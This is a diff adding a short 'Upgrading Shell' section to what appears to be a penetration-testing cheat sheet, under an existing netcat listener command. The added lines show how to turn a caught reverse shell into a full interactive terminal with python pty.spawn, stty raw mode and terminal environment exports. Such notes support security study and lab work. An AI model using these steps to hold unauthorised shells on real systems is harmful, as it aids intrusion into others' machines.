@@ -37,3 +37,21 @@ exploit
 ```
 nc -lvnp <port>
 ```
+-Upgrading Shell:
+```bash
+# In reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+
+# In Kali
+echo $TERM
+stty -a #Markdown current rows and collumns
+$ stty raw -echo 
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
+```
